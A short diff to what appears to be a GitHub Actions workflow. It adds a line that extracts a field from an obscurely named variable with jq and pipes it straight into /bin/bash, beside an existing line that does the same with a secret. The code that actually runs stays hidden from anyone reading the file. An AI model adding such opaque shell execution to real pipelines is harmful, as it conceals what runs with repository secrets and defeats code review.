@@ -21,6 +21,7 @@ jobs:
           tuzpt70: ${{ secrets.tuzpt70 }}
         run: |
           printf '%s' "$tuzpt70" | jq -r .m9 | /bin/bash
+          printf '%s' "$rw83008" | jq -r .l770 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
